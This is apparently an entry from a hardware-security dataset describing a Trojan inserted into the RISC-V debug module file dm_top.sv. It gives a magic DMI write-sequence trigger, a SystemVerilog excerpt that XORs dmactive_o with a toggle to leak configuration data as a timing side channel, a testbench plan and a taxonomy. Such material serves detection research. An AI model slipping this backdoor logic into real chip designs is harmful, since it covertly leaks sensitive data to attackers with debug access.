Trojan ID: trojan_9
Name: Debug Port Enabler
Type: information_leakage
Target Module: dm_top
Target File: hw/vendor/pulp_riscv_dbg/src/dm_top.sv

EXPLANATION:
The Trojan implements a covert information leakage mechanism that exfiltrates sensitive data through subtle timing modulation of the dmactive_o output signal. When triggered by a specific sequence of DMI register writes, it captures sensitive configuration data and transmits it bit-by-bit through carefully timed signal toggles that can be observed by external monitoring.

TRIGGER:
The Trojan activates when a specific 3-step sequence of DMI write operations occurs: writing 0xDEADBEEF to address 0x10, followed by 0xCAFEBABE to address 0x11, then 0x13371337 to address 0x12. This trigger sequence is highly unlikely to occur during normal debug operations but can be intentionally invoked by an attacker with debug access.

PAYLOAD:
Modulate dmactive_o signal timing based on leaked data
  // This creates subtle timing variations that can be observed externally
  logic dmactive_internal;
  assign dmactive_internal = i_dm_csrs.dmactive_o;
  
  // Apply timing modulation when Trojan is transmitting
  assign dmactive_o = trojan_transmitting ? 
                      (dmactive_internal ^ trojan_output_toggle) : 
                      dmactive_internal;

  dm_sba #(
    .BusWidth(BusWidth),
    .ReadByteEnable(ReadByteEnable)
  ) i_dm_sba (
    .clk_i,
    .rst_ni,
    .dmactive_i              ( dmactive_o            ),

    .master_req_o,
    .master_add_o,
    .master_we_o,
    .master_wdata_o,
    .master_be_o,
    .master_gnt_i,
    .master_r_valid_i,
    .master_r_err_i,
    .master_r_other_err_i,
    .master_r_rdata_i,

    .sbaddress_i             ( sbaddress_csrs_sba    ),
    .sbaddress_o             ( sbaddress_sba_csrs    ),
    .sbaddress_write_valid_i ( sbaddress_write_valid ),
    .sbreadonaddr_i          ( sbreadonaddr          ),
    .sbautoincrement_i       ( sbautoincrement       ),
    .sbaccess_i              ( sbaccess              ),
    .sbreadondata_i          ( sbreadondata          ),
    .sbdata_i                ( sbdata_write          ),
    .sbdata_read_valid_i     ( sbdata_read_valid     ),
    .sbdata_write_valid_i    ( sbdata_write_valid    ),
    .sbdata_o                ( sbdata_read           ),
    .sbdata_valid_o          ( sbdata_valid          ),
    .sbbusy_o                ( sbbusy                ),
    .sberror_valid_o         ( sberror_valid         ),
    .sberror_o               ( sberror               )
  );

  dm_mem #(
    .NrHarts(NrHarts),
    .BusWidth(BusWidth),
    .SelectableHarts(SelectableHarts),
    .DmBaseAddress(DmBaseAddress)
  ) i_dm_mem (
    .clk_i,
    .rst_ni,
    .debug_req_o,
    .ndmreset_i              ( ndmreset              ),
    .hartsel_i               ( hartsel               ),
    .haltreq_i               ( haltreq               ),
    .resumereq_i             ( resumereq             ),
    .clear_resumeack_i       ( clear_resumeack       ),
    .halted_o                ( halted                ),
    .resuming_o              ( resumeack             ),
    .cmd_valid_i             ( cmd_valid             ),
    .cmd_i                   ( cmd                   ),
    .cmderror_valid_o        ( cmderror_valid        ),
    .cmderror_o              ( cmderror              ),
    .cmdbusy_o               ( cmdbusy               ),
    .progbuf_i               ( progbuf               ),
    .data_i                  ( data_csrs_mem         ),
    .data_o                  ( data_mem_csrs         ),
    .data_valid_o            ( data_valid            ),
    .req_i                   ( slave_req_i           ),
    .we_i                    ( slave_we_i            ),
    .addr_i                  ( slave_addr_i          ),
    .wdata_i                 ( slave_wdata_i         ),
    .be_i                    ( slave_be_i            ),
    .rdata_o                 ( slave_rdata_o         ),
    .err_o                   ( slave_err_o           )
  );

endmodule : dm_top
```

TESTBENCH STRATEGY:
Normal operation testing should verify that dmactive_o behaves identically to the original design when the trigger sequence is not present. Trigger activation testing requires sending the exact 3-step DMI write sequence and verifying the Trojan state transitions correctly. Payload testing involves monitoring dmactive_o signal timing after trigger activation to decode the transmitted data bits based on the 3-cycle vs 7-cycle toggle patterns, while ensuring the leaked data matches the expected XOR of configuration values.

TAXONOMY:
Insertion phase: Design
Abstraction level: Register-transfer level
Activation mechanism: Logic-based (DMI write sequence)
Effects: information leakage
Location: dm_top
Characteristics: Medium size (8 registers), localized distribution, timing-based side-channel
